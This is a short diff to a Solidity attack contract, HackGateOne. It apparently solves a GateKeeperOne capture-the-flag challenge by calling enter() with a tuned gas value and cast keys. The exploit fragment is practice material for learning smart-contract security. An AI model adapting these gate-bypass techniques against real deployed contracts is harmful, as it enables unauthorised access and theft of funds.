@@ -16,7 +16,7 @@ contract HackGateOne {
     gateko = GateKeeperOne(gatekoadd);
   }
 
-  function hack(bytes32 _gateKey) public {
+  function hack(uint64 _gateKey) public {
     (bool result, bytes memory data) = gatekoadd.call.value(0 ether).gas(1065084)(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
     emit Fail(data);
   }
@@ -43,6 +43,11 @@ contract HackGateOne {
 
   function get_bytes_from_64(uint64 _gateKey) view public returns (bytes8) {
       return bytes8(_gateKey);
+  }
+
+  //
+  function get64_16(uint16 _gateKey) view public returns (uint64) {
+    return uint64(_gateKey);
   }
 
 }
